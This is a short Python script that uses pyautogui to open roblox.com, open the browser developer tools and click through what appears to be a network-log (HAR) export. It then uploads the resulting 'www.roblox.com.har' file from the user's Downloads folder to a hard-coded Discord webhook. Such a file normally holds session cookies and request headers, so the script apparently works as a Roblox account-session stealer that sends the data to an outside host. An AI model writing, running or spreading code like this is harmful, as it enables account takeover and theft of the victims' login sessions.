import pyautogui
import webbrowser
import time

# Step 1: Open Roblox website
webbrowser.open("https://www.roblox.com")
time.sleep(5)  # Wait for browser to load

# Step 2: Press a keyboard key (customize this)
pyautogui.press('F12')  # Replace 'your_key' with the key you want to press
time.sleep(1)

pyautogui.moveTo(1666, 121)
pyautogui.click()

time.sleep(1)
pyautogui.moveTo(1674, 178)
pyautogui.click()

time.sleep(1)
pyautogui.moveTo(1456, 194)
pyautogui.click()

time.sleep(1)
pyautogui.press('enter')

import os
import requests

downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
file_path = os.path.join(downloads_folder, "www.roblox.com.har")

webhook_url = 'https://discord.com/api/webhooks/1395243183411171419/sgO-__Oqvmj56mkb7ElatW-MS2FEi_hjLm6WjeWB8trCDBa1VM7UDuxYEHvv2dVDe_Ia'

with open(file_path, 'rb') as f:
    response = requests.post(webhook_url, files={'file': f})

print("Webhook response status:", response.status_code)
